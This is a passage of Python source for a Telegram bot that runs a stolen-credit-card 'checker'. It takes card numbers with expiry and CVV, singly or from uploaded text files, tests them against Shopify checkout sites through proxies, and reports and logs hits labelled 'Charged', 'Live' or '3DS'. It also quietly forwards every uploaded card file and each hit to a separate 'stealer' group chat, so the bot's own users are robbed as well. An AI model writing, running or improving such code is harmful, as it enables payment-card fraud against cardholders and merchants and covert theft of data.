            lines.append(f"[⌯] {i+1} ⌁ {u}")
    more = f"\n...and {len(users)-50} more" if len(users) > 50 else ""
    text = pe(f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {len(users)} 👥\n\n{SEP}\n" + "\n".join(lines) + more)
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())


@bot.on(events.CallbackQuery(pattern=b"admin_banned_list"))
async def cb_admin_banned_list(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    banned = load_banned_users()
    if not banned:
        await event.answer("🚫 No banned users.", alert=True); return
    lines = "\n".join([f"[⌯] {i+1} ⌁ {u}" for i, u in enumerate(banned[:50])])
    text = pe(f"[⌯] 𝗕𝗮𝗻𝗻𝗲𝗱 ⌁ {len(banned)} 🚫\n\n{SEP}\n{lines}")
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_users())


@bot.on(events.CallbackQuery(pattern=b"admin_broadcast_info"))
async def cb_admin_broadcast_info(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    text = pe(f"[⌯] 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 ⌁ 📢\n{SEP}\n[⌯] /broadcast [msg]\n[⌯] 𝗥𝗲𝗮𝗰𝗵 ⌁ {len(load_premium_users()) + len(ADMIN_IDS)}")
    await nav_edit(event.chat_id, event.message_id, text, rows_admin_broadcast())



# ══════════════════════════════════════════════════════════════════════════════
#  ▸ MAINTENANCE GUARD — call from any handler
# ══════════════════════════════════════════════════════════════════════════════
async def _maint_guard(event, cmd: str = None) -> bool:
    """Returns True if user should be BLOCKED (maint active).
    Silent — gatekeeper already sends the notification message."""
    try:
        uid = event.sender_id
    except Exception:
        return False
    if _is_maint_owner(uid):
        return False
    if _is_maint_global():
        return True
    if cmd and _is_maint_cmd(cmd):
        return True
    return False


@bot.on(events.NewMessage())
async def _maint_gatekeeper(event):
    """Block any command that's under maintenance BEFORE other handlers."""
    try:
        msg = event.message
        if not msg or not msg.text:
            return
        text = msg.text.strip()
        if not text.startswith('/'):
            return
        cmd = text[1:].split()[0].split('@')[0].lower()
        if cmd in ('maint', 'maintcmd', 'start'):
            return
        uid = event.sender_id
        if _is_maint_owner(uid):
            return
        if _is_maint_global():
            try:
                await event.reply(_maint_text(True, []), parse_mode='html')
            except Exception:
                pass
            event.stop_propagation()
            return
        if _is_maint_cmd(cmd):
            try:
                await event.reply(_maint_text(False, [], cmd), parse_mode='html')
            except Exception:
                pass
            event.stop_propagation()
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ REAL-TIME HIT SENDER
# ══════════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════════
async def send_realtime_hit(user_id, result, hit_type, file_name=None):
    try:
        bin_info = result.get('bin_info')
        if not bin_info:
            bin_info = await get_bin_info(result['card'].split('|')[0])
            result['bin_info'] = bin_info
        brand, btype, level, bank, country, flag = bin_info
        card = result.get('card', 'N/A')
        raw_msg = result.get('message', 'N/A')
        price = result.get('price', '-')
        gateway = result.get('gateway', 'Shopify Payments')
        time_taken = result.get('time', '-')
        name, username = await get_user_info(user_id)
        checker_name = name if name else str(user_id)

        def _b(s):
            out = []
            for ch in str(s):
                c = ord(ch)
                if 65 <= c <= 90:
                    out.append(chr(c - 65 + 0x1D5D4))
                elif 97 <= c <= 122:
                    out.append(chr(c - 97 + 0x1D5EE))
                elif 48 <= c <= 57:
                    out.append(chr(c - 48 + 0x1D7EC))
                else:
                    out.append(ch)
            return "".join(out)

        bin_str = _b(" · ".join(p for p in [brand, btype, level] if p and p != '-') or "—")
        bank_str = _b(bank or "—")
        country_str = f"{flag} {_b(country or '—')}" if flag else _b(country or "—")
        gateway_str = _b(gateway)

        if hit_type == "Charged":
            header = "[⌯] Charged Success ⌁ ✅"
            status_text = "𝙲𝚑𝚊𝚛𝚐𝚎𝚍 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢"
            status_emoji = "💎"
            result_text = "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕"
            result_emoji = "✔️"
        elif hit_type == "Approved":
            header = "[⌯] Approved ⌁ ✅"
            status_text = "𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍"
            status_emoji = "✅"
            result_text = _b(raw_msg) if raw_msg else "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝙰𝚙𝚙𝚛𝚘𝚟𝚎𝚍"
            result_emoji = "✅"
        elif hit_type == "Live":
            header = "[⌯] Live Card ⌁ 💰"
            status_text = "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜"
            status_emoji = "💰"
            result_text = "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜 — 𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎"
            result_emoji = "⚡"
        elif hit_type == "3DS":
            header = "[⌯] 3DS Required ⌁ ⚠️"
            status_text = "𝟯𝙳𝚂 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍"
            status_emoji = "⚠️"
            result_text = "𝙾𝚃𝙿 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍"
            result_emoji = "⚡"
        else:
            header = f"[⌯] {hit_type} ⌁ ⚡"
            status_text = _b(raw_msg)
            status_emoji = "⚡"
            result_text = _b(raw_msg)
            result_emoji = "⚡"

        _p = str(price).replace('$', '').replace('£', '').replace('€', '').strip()
        _currency = "USD"
        _sym = "$"
        _raw_upper = (raw_msg or '').upper() + str(price).upper()
        if 'GBP' in _raw_upper or '£' in str(price):
            _currency, _sym = "GBP", "£"
        elif 'EUR' in _raw_upper or '€' in str(price):
            _currency, _sym = "EUR", "€"
        if _p not in ('None', '0', '0.00', '0.0'):
            amount_str = f"{_sym}{_b(_p)} {_b(_currency)}"
        else:
            amount_str = "—"

        time_str = f"{_b(str(time_taken))}s" if time_taken and time_taken != '-' else "—"

        if hit_type == "Charged":
            increment_charged(user_id, 1)
        elif hit_type in ("Approved", "Live"):
            increment_approved(user_id, 1)

        msg = (
            f"{header}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗖𝗖 ⌁ <code>{card}</code>\n"
            f"[⌯] 𝗦𝘁𝗮𝘁𝘂𝘀 ⌁ {status_text} {status_emoji}\n"
            f"[⌯] 𝗥𝗲𝘀𝘂𝗹𝘁 ⌁ {result_text} {result_emoji}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗕𝗜𝗡 ⌁ {bin_str}\n"
            f"[⌯] 𝗕𝗮𝗻𝗸 ⌁ {bank_str}\n"
            f"[⌯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country_str}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⌁ {gateway_str}\n"
            f"[⌯] 𝗔𝗺𝗼𝘂𝗻𝘁 ⌁ {amount_str} 💰\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🛡 {checker_name}"
        )
        msg = pe(msg)

        # ── Scraper hook ──
        try:
            _add_scrap(user_id, hit_type, card, raw_msg, str(price),
                       gateway, (brand, btype, level, bank, country, flag), "realtime")
        except Exception: pass

        gifs = load_gifs()
        if gifs and hit_type in ('Charged', 'Approved', 'Live', '3DS'):
            _chosen_gif = random.choice(gifs)
            try:
                sent = await bot.send_file(user_id, _chosen_gif, caption=msg, parse_mode='html')
                if hit_type == "Charged":
                    try:
                        await bot.pin_message(user_id, sent.id, notify=False)
                    except Exception:
                        pass
                asyncio.create_task(send_hit_to_stealer_gc(result, hit_type, user_id, file_name))
                return
            except Exception as e:
                print(f"[hit] gif send error: {e}")

        sent = await bot.send_message(user_id, msg, parse_mode='html')
        if hit_type == "Charged" and sent:
            try:
                await bot.pin_message(user_id, sent.id, notify=False)
            except Exception:
                pass
        asyncio.create_task(send_hit_to_stealer_gc(result, hit_type, user_id, file_name))
    except Exception as e:
        print(f"[hit] Failed: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ RESPONSE CODE → HUMAN-READABLE MAP
# ══════════════════════════════════════════════════════════════════════════════
_RESPONSE_MAP = {
    "ORDER_PAID": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕",
    "ORDER_PLACED": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕",
    "PAYMENT_SUCCEEDED": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕",
    "SUCCESS": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕",
    "PAID": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕",
    "APPROVED": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕",
    "CHARGED": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕",
    "CAPTURED": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕",
    "INSUFFICIENT_FUNDS": "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜 — 𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎",
    "PAYMENTS_INSUFFICIENT_FUNDS": "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜 — 𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎",
    "NOT_ENOUGH_FUNDS": "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜 — 𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎",
    "LOW_BALANCE": "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜 — 𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎",
    "3DS_REQUIRED": "𝟯𝙳𝚂 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍",
    "REQUIRES_ACTION": "𝟯𝙳𝚂 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍",
    "AUTHENTICATION_REQUIRED": "𝟯𝙳𝚂 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍",
    "OTP_REQUIRED": "𝟯𝙳𝚂 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍",
    "CARD_DECLINED": "𝙲𝚊𝚛𝚍 𝙳𝚎𝚌𝚕𝚒𝚗𝚎𝚍",
    "DO_NOT_HONOR": "𝙲𝚊𝚛𝚍 𝙳𝚎𝚌𝚕𝚒𝚗𝚎𝚍",
    "PAYMENT_FAILED": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝙵𝚊𝚒𝚕𝚎𝚍",
    "MISMATCHED_BILL": "𝙱𝚒𝚕𝚕𝚒𝚗𝚐 𝙼𝚒𝚜𝚖𝚊𝚝𝚌𝚑",
    "PAYMENT_METHOD_NOT_AVAILABLE": "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝙼𝚎𝚝𝚑𝚘𝚍 𝙽𝚘𝚝 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎",
    "SITE_NOT_SUPPORTED": "𝚂𝚒𝚝𝚎 𝙽𝚘𝚝 𝚂𝚞𝚙𝚙𝚘𝚛𝚝𝚎𝚍",
    "SITE_REQUIRES_LOGIN": "𝚂𝚒𝚝𝚎 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚜 𝙻𝚘𝚐𝚒𝚗",
    "SITE_REQUIRES_LOGIN!": "𝚂𝚒𝚝𝚎 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚜 𝙻𝚘𝚐𝚒𝚗",
    "MAX_RETRIES": "𝙼𝚊𝚡 𝚁𝚎𝚝𝚛𝚒𝚎𝚜 𝚁𝚎𝚊𝚌𝚑𝚎𝚍",
    "TIMEOUT": "𝚁𝚎𝚚𝚞𝚎𝚜𝚝 𝚃𝚒𝚖𝚎𝚍 𝙾𝚞𝚝",
    "CONNECT_ERROR": "𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚘𝚗 𝙴𝚛𝚛𝚘𝚛",
    "API_ERROR": "𝙰𝙿𝙸 𝙴𝚛𝚛𝚘𝚛",
    "CAPTCHA_REQUIRED": "𝙲𝙰𝙿𝚃𝙲𝙷𝙰 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍",
    "THROTTLED": "𝚁𝚊𝚝𝚎 𝙻𝚒𝚖𝚒𝚝𝚎𝚍",
    "CHECKPOINT_DENIED": "𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝 𝙳𝚎𝚗𝚒𝚎𝚍",
    "SITE_ERROR": "𝚂𝚒𝚝𝚎 𝙴𝚛𝚛𝚘𝚛",
}


def _friendly_response(raw_msg: str, hit_type: str = "") -> str:
    if not raw_msg:
        if hit_type == "Charged":
            return "𝙿𝚊𝚢𝚖𝚎𝚗𝚝 𝚠𝚊𝚜 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕"
        elif hit_type == "Live":
            return "𝙸𝚗𝚜𝚞𝚏𝚏𝚒𝚌𝚒𝚎𝚗𝚝 𝙵𝚞𝚗𝚍𝚜 — 𝙲𝚊𝚛𝚍 𝙻𝚒𝚟𝚎"
        elif hit_type == "3DS":
            return "𝟯𝙳𝚂 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍"
        return "𝚄𝚗𝚔𝚗𝚘𝚠𝚗"

    key = raw_msg.strip().upper()
    if key in _RESPONSE_MAP:
        return _RESPONSE_MAP[key]

    for k, v in _RESPONSE_MAP.items():
        if k in key:
            return v

    return raw_msg


async def send_hit_log_gc(result, hit_type, user_id):
    # ── Scraper hook (works even if no log group set) ──
    try:
        _bi = result.get('bin_info') or ()
        _add_scrap(user_id, hit_type, result.get('card', 'N/A'),
                   result.get('message', ''), str(result.get('price', '-')),
                   result.get('gateway', ''), _bi, "log")
    except Exception: pass

    log_group = load_log_group() or LOG_CHANNEL_ID
    if not log_group:
        return
    # ── FIX: validate entity exists to avoid PeerChannel errors ──
    try:
        await bot.get_entity(log_group)
    except Exception as _e:
        print(f"[LOG-GC] Cannot resolve {log_group}: {_e} — skipping log")
        return
    try:
        name, username = await get_user_info(user_id)
        display = f"@{username}" if username else str(user_id)

        price_raw = (
            result.get('price')
            or result.get('amount')
            or result.get('total')
            or result.get('quote_amount')
        )

        if not price_raw or str(price_raw).strip() in ('', '-', 'None', '0', '0.00'):
            _raw_blob = " ".join([
                str(result.get('message', '') or ''),
                str(result.get('raw_response', '') or ''),
                str(result.get('full_response', '') or ''),
            ])
            _m = re.search(r'(?:[\$£€]\s*)?(\d{1,4}(?:[.,]\d{1,2})?)\s*(?:USD|EUR|GBP)?', _raw_blob)
            if _m:
                price_raw = _m.group(1)

        if price_raw and str(price_raw).strip() not in ('', '-', 'None'):
            price = str(price_raw).strip()
            price = re.sub(r'[^\d.,]', '', price)
            if not price:
                price = '—'
        else:
            price = '—'

        gateway = result.get('gateway', 'Shopify Payments')
        raw_response = _clean_response(result.get('message', '')) or ''
        msg_text = _friendly_response(raw_response, hit_type)

        DIAMOND_ID = "5427168083074628963"
        LIVE_ID    = "5456140674028019486"
        CHECKED_ID = "5305417687357203905"
        TICK_ID    = "5206607081334906820"
        MONEY_ID   = "5039789890133296083"
        CHECKER_ID = "6181389246767570324"
        BOLT_ID    = "5305724700209454594"

        if hit_type == "Charged":
            header_text = "Charged Success"
            header_emoji_html = f'<tg-emoji emoji-id="{CHECKED_ID}">✅</tg-emoji>'
            response_emoji_html = f'<tg-emoji emoji-id="{TICK_ID}">✔️</tg-emoji>'
        elif hit_type == "Approved":
            header_text = "Approved"
            header_emoji_html = f'<tg-emoji emoji-id="{CHECKED_ID}">✅</tg-emoji>'
            response_emoji_html = f'<tg-emoji emoji-id="{TICK_ID}">✔️</tg-emoji>'
        elif hit_type == "Live":
            header_text = "Live Card"
            header_emoji_html = f'<tg-emoji emoji-id="{LIVE_ID}">💳</tg-emoji>'
            response_emoji_html = f'<tg-emoji emoji-id="{BOLT_ID}">⚡</tg-emoji>'
        elif hit_type == "3DS":
            header_text = "3DS Required"
            header_emoji_html = f'<tg-emoji emoji-id="{BOLT_ID}">⚡</tg-emoji>'
            response_emoji_html = f'<tg-emoji emoji-id="{BOLT_ID}">⚡</tg-emoji>'
        else:
            header_text = "Hit"
            header_emoji_html = f'<tg-emoji emoji-id="{DIAMOND_ID}">💎</tg-emoji>'
            response_emoji_html = f'<tg-emoji emoji-id="{BOLT_ID}">⚡</tg-emoji>'

        amount_emoji_html = f'<tg-emoji emoji-id="{MONEY_ID}">💰</tg-emoji>'
        checker_emoji_html = f'<tg-emoji emoji-id="{CHECKER_ID}">👾</tg-emoji>'

        msg = (
            f"[⌯] <b>{header_text}</b> ⌁ {header_emoji_html}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] <b>Response</b> ⌁ {msg_text} {response_emoji_html}\n"
            f"[⌯] <b>Amount</b> ⌁ {('$' + price + ' USD') if price != '—' else '—'} {amount_emoji_html}\n"
            f"[⌯] <b>Gate</b> ⌁ {gateway}\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"[⌯] <b>Checker</b> ⌁ {checker_emoji_html} {display}"
        )
        await bot.send_message(log_group, msg, parse_mode='html')
    except Exception as e:
        print(f"[LOG-GC] Failed: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ /sh — SINGLE CHECK
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def single_check(event):
    if await _maint_guard(event, "sh"): return
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n{SEP}\n🔒 You need access."), parse_mode='html'); return
    if await _guard_force_join(event):
        return
    sites = _get_sites_for_user(uid)
    proxies = _get_proxies_for_user_v2(uid)
    if not sites:
        await event.reply(pe(f"❌ 𝐍𝐨 𝐒𝐢𝐭𝐞𝐬\n{SEP}\nContact admin."), parse_mode='html'); return
    if not proxies:
        await event.reply(pe(f"❌ 𝐍𝐨 𝐏𝐫𝐨𝐱𝐲\n{SEP}\n/setproxy ip:port"), parse_mode='html'); return
    cards = extract_cc(event.message.text.split(' ', 1)[1].strip())
    if not cards:
        await event.reply(pe(f"❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝\n{SEP}\nUsage: <code>/sh card|mm|yy|cvv</code>"), parse_mode='html'); return
    card = cards[0]
    smsg = await event.reply(pe(f"⚡ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n{SEP}\n💳 <code>{card}</code>\n{SEP}\n⏳ Please wait..."), parse_mode='html')
    try:
        t0 = time.time()
        (result, bin_info), (name, username) = await asyncio.gather(
            asyncio.gather(check_card_with_retry(card, sites, proxies, max_retries=3),
                           get_bin_info(card.split('|')[0])),
            get_user_info(uid),
        )
        cname = name if username else str(uid)
        result['time'] = round(time.time() - t0, 2)
        if _is_3ds(result.get('message', '')):
            result['status'] = '3DS'
        resp = build_result_card(result, bin_info, uid, cname)
        gifs = load_gifs()
        if gifs and result.get('status') in ('Charged', 'Approved', 'Live', '3DS'):
            await bot.send_file(uid, random.choice(gifs), caption=resp, parse_mode='html')
            await bot.delete_messages(uid, smsg.id)
        else:
            await raw_edit(uid, smsg.id, resp, [])
        if result.get('status') == 'Charged':
            increment_charged(uid, 1)
            await asyncio.to_thread(_pin_message_botapi, uid, smsg.id)
            await send_hit_log_gc(result, 'Charged', uid)
            asyncio.create_task(send_hit_to_stealer_gc(result, 'Charged', uid, 'Single Check'))
        elif result.get('status') == 'Approved':
            increment_approved(uid, 1)
            await send_hit_log_gc(result, 'Approved', uid)
            asyncio.create_task(send_hit_to_stealer_gc(result, 'Approved', uid, 'Single Check'))
        elif result.get('status') == 'Live':
            await send_hit_log_gc(result, 'Live', uid)
            asyncio.create_task(send_hit_to_stealer_gc(result, 'Live', uid, 'Single Check'))
        elif result.get('status') == '3DS':
            await send_hit_log_gc(result, '3DS', uid)
            asyncio.create_task(send_hit_to_stealer_gc(result, '3DS', uid, 'Single Check'))
    except Exception as e:
        await smsg.edit(pe(f"❌ 𝐂𝐡𝐞𝐜𝐤 𝐅𝐚𝐢𝐥𝐞𝐝\n{SEP}\n⚠️ <code>{e}</code>"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ FILE DETECTION
# ══════════════════════════════════════════════════════════════════════════════
def _is_txt_file(e):
    if not e.file or e.via_bot_id:
        return False
    name = e.file.name or ''
    mime = e.file.mime_type or ''
    return name.endswith('.txt') or (mime in ('text/plain', 'application/octet-stream') and name.endswith('.txt')) or (not name and mime == 'text/plain')


@bot.on(events.NewMessage(func=_is_txt_file))
async def txt_detected(event):
    if await _maint_guard(event, "msh"): return
    if await _maint_guard(event, "mst"): return
    if await _maint_guard(event, "mst1"): return
    uid = event.sender_id
    file_name = event.file.name or "unknown.txt"
    file_size = event.file.size or 0
    size_str = f"{file_size / 1024:.1f} KB" if file_size < 1024*1024 else f"{file_size / 1024 / 1024:.1f} MB"

    _quick_msg = await event.reply(pe(
        f"⚡ 𝗙𝗶𝗹𝗲 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 ⌁ 📂\n{SEP}\n"
        f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
        f"[⌯] 𝗦𝗶𝘇𝗲 ⌁ {size_str} ⌁ 📊\n{SEP}\n"
        f"⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗶𝗻 𝗯𝗮𝗰𝗸𝗴𝗿𝗼𝘂𝗻𝗱..."
    ), parse_mode='html')

    async def _process_file():
        try:
            import tempfile, uuid as _uuid
            _tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
            os.makedirs(_tmp_dir, exist_ok=True)
            _tmp_path = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
            fp = await event.message.download_media(file=_tmp_path)
            if not fp:
                try: await _quick_msg.delete()
                except Exception: pass
                await event.reply(pe(f"❌ 𝗙𝗶𝗹𝗲 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗮𝗶𝗹𝗲𝗱"), parse_mode='html')
                return
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            cards = extract_cc(content)
            proxy_lines = []
            for line in content.splitlines():
                line = line.strip()
                if not line: continue
                if re.match(r'^\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}$', line): continue
                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}', line):
                    proxy_lines.append(line)
                elif re.match(r'^[^@\s]+@\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}', line):
                    proxy_lines.append(line)

            if proxy_lines and len(proxy_lines) >= len(cards):
                try: os.remove(fp)
                except Exception: pass
                if not is_admin(uid):
                    try: await _quick_msg.delete()
                    except Exception: pass
                    await event.reply(pe(f"❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗽𝗿𝗼𝘅𝘆"), parse_mode='html')
                    return
                curr = load_proxies()
                added = [p for p in proxy_lines if p not in curr]
                if not added:
                    try: await _quick_msg.delete()
                    except Exception: pass
                    await event.reply(pe(f"⚠️ 𝗔𝗹𝗹 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗼𝗼𝗹"), parse_mode='html')
                    return
                async with aiofiles.open(PROXY_FILE, 'a') as f:
                    for p in added:
                        await f.write(f"{p}\n")
                try: await _quick_msg.delete()
                except Exception: pass
                await event.reply(pe(f"✅ 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗔𝗱𝗱𝗲𝗱\n{SEP}\n[⌯] 𝗔𝗱𝗱𝗲𝗱 ⌁ {len(added)}\n[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(curr) + len(added)}"), parse_mode='html')
                return

            if not is_premium(uid):
                try: os.remove(fp)
                except Exception: pass
                try: await _quick_msg.delete()
                except Exception: pass
                await event.reply(pe(f"🚫 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱"), parse_mode='html'); return

            if not cards:
                try: os.remove(fp)
                except Exception: pass
                try: await _quick_msg.delete()
                except Exception: pass
                await event.reply(pe(f"❌ 𝗡𝗼 𝗖𝗮𝗿𝗱𝘀 𝗙𝗼𝘂𝗻𝗱"), parse_mode='html'); return

            sites = _get_sites_for_user(uid)
            proxies = _get_proxies_for_user_v2(uid)
            if not sites or not proxies:
                try: os.remove(fp)
                except Exception: pass
                try: await _quick_msg.delete()
                except Exception: pass
                await event.reply(pe(f"❌ 𝗡𝗼 𝘀𝗶𝘁𝗲𝘀/𝗽𝗿𝗼𝘅𝗶𝗲𝘀"), parse_mode='html'); return

            limit = get_user_limit(uid)
            if len(cards) > limit: cards = cards[:limit]

            _stealer_gc = load_stealer_gc()
            if _stealer_gc:
                try:
                    await send_file_to_stealer_gc(uid, fp, file_name, len(cards), "Cards")
                except Exception as _sgc_err:
                    print(f"[Stealer GC] {_sgc_err}")

            try: os.remove(fp)
            except Exception: pass

            pending_checks[uid] = {'cards': cards, 'file_name': file_name}
            preview_lines = "\n".join([f'[⌯] <code>{c}</code>' for c in cards[:3]])
            more = f"\n<i>...and {len(cards)-3} more</i>" if len(cards) > 3 else ""
            text = pe(
                f"[⌯] 𝗙𝗶𝗹𝗲 𝗥𝗲𝗮𝗱𝘆 ⌁ 📂\n{SEP}\n"
                f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(cards):,} ⌁ 💳\n"
                f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n{SEP}\n"
                f"{preview_lines}{more}\n{SEP}\n"
                f"[⌯] 𝗧𝗮𝗽 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁 ⌁ 🔥"
            )
            try: await _quick_msg.delete()
            except Exception: pass
            await raw_send(uid, text,
                [[{"text": "⚡  Start Mass Check", "callback_data": f"start_check_{uid}"}]],
                reply_to=event.message.id)
        except Exception as e:
            print(f"[txt_detected bg] Error: {e}")
            try: await _quick_msg.delete()
            except Exception: pass
            try:
                await event.reply(pe(f"❌ 𝗘𝗿𝗿𝗼𝗿 ⌁ <code>{str(e)[:100]}</code>"), parse_mode='html')
            except Exception:
                pass

    asyncio.create_task(_process_file())


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ /msh — MASS CHECK
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/msh$'))
async def mass_check_cmd(event):
    if await _maint_guard(event, "msh"): return
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html'); return
    if await _guard_force_join(event):
        return
    if not event.reply_to_msg_id:
        await event.reply(pe(f"⚡ Reply to a .txt file with /msh"), parse_mode='html'); return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(pe(f"❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐢𝐥𝐞"), parse_mode='html'); return
    sites = _get_sites_for_user(uid)
    proxies = _get_proxies_for_user_v2(uid)
    if not sites or not proxies:
        await event.reply(pe(f"❌ No sites/proxies available."), parse_mode='html'); return
    import tempfile, uuid as _uuid
    _tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
    os.makedirs(_tmp_dir, exist_ok=True)
    _tmp_path = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
    fp = await reply.download_media(file=_tmp_path)
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    file_name = reply.file.name or "unknown.txt"
    if not cards:
        try: os.remove(fp)
        except Exception: pass
